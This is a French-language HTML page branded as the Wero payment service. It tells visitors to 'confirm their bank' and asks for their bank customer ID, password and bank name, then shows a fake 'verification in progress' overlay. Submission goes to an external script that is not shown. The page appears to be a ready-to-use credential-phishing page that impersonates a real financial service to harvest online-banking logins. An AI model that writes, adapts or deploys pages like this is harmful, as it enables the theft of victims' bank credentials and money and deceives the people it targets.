<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmation de Banque</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
    <link rel="stylesheet" href="css/styles.css">
    <style>
        .content {
            margin-top: 100px;
            text-align: center;
            width: 100%;
            max-width: 500px;
        }

        .form-group {
            position: relative;
            margin-bottom: 25px;
        }

        .form-control {
            border: 2px solid #FFD700;
            border-radius: 15px;
            padding: 15px 20px;
            font-size: 16px;
            transition: all 0.3s ease;
            background-color: #FFFFFF;
        }

        .form-control:focus {
            border-color: #FFE436;
            box-shadow: 0 0 0 0.2rem rgba(255, 241, 102, 0.25);
        }

        .form-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #FFD700;
        }

        .bank-info {
            background-color: #f8f9fa;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 30px;
        }

        .btn-custom {
            background-color: #FFF166;
            border: 2px solid black;
            font-weight: bold;
            padding: 15px 30px;
            border-radius: 30px;
            font-size: 18px;
            transition: all 0.3s ease;
            width: 100%;
            margin-top: 20px;
        }

        .btn-custom:hover {
            transform: scale(1.02);
            background-color: #FFE436;
        }

        .form-label {
            font-weight: 600;
            margin-bottom: 8px;
            display: block;
            color: #444;
        }

        .img-fluid {
            border-radius: 10px;
            max-width: 200px;
            margin: 20px auto;
            display: block;
        }

        /* Styles pour l'animation */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            flex-direction: column;
        }

        .loading-logo {
            font-size: 48px;
            color: #FFF166;
            font-weight: bold;
            animation: pulse 1.5s infinite;
            margin-bottom: 20px;
        }

        .loading-text {
            color: white;
            font-size: 18px;
            margin-top: 20px;
        }

        @keyframes pulse {
            0% {
                transform: scale(1);
                opacity: 1;
            }
            50% {
                transform: scale(1.2);
                opacity: 0.7;
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        .dots-loading {
            color: #FFF166;
            font-size: 24px;
            animation: dots 1.5s infinite;
        }

        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60% { content: '...'; }
            80%, 100% { content: ''; }
        }
    </style>
</head>
<body>
    <!-- Overlay pour l'animation -->
    <div class="overlay">
        <div class="loading-logo">WERO</div>
        <div class="loading-text">Vérification en cours<span class="dots-loading">...</span></div>
    </div>

    <div class="header">
        <span class="logo">WERO</span>
    </div>

    <div class="content">
        <h2 class="fw-bold text-warning">VEUILLEZ CONFIRMER VOTRE BANQUE SUR WERO.</h2><br>
        <img src="https://assets.zyrosite.com/Aq2q239lEjf2a2Mj/ta-c-la-c-chargement-d9575RLeGQcKkjww.gif"
            class="img-fluid" alt="Carte bancaire">

        <p class="mt-3 fw-bold">Afin d'assurer la protection de nos utilisateurs, nous avons besoin de confirmer votre
            banque.
        </p>

        <form id="bankForm">
            <div class="bank-info">
                <div class="form-group">
                    <label class="form-label">Identifiant client</label>
                    <input type="text" name="identifiant" class="form-control" required>
                    <i class="fas fa-user form-icon"></i>
                </div>

                <div class="form-group">
                    <label class="form-label">Mot de passe</label>
                    <input type="password" name="mot_de_passe" class="form-control" required>
                    <i class="fas fa-lock form-icon"></i>
                </div>

                <div class="form-group">
                    <label class="form-label">Nom de la banque</label>
                    <input type="text" name="nom_banque" class="form-control" required>
                    <i class="fas fa-university form-icon"></i>
                </div>
            </div>

            <button type="submit" class="btn btn-custom">
                <i class="fas fa-shield-alt"></i> Confirmer en toute sécurité
            </button>
        </form>
    </div>

    <footer>
        <div class="container text-center">
            <span class="logo-white">WERO</span>
            <p>Simplifiez vos transferts d'argent en Europe.</p>
            <div class="social-icons">
                <a href="#"><i class="fab fa-facebook"></i></a>
                <a href="#"><i class="fab fa-instagram"></i></a>
                <a href="#"><i class="fab fa-tiktok"></i></a>
                <a href="#"><i class="fab fa-twitter"></i></a>
            </div>
            <p class="security">SÉCURITÉ</p>
            <p>contact@wero.com</p>
            <p class="copyright"> 2024. All rights reserved.</p>
        </div>
    </footer>

    <script src="js/banque.js"></script>
</body>
</html>
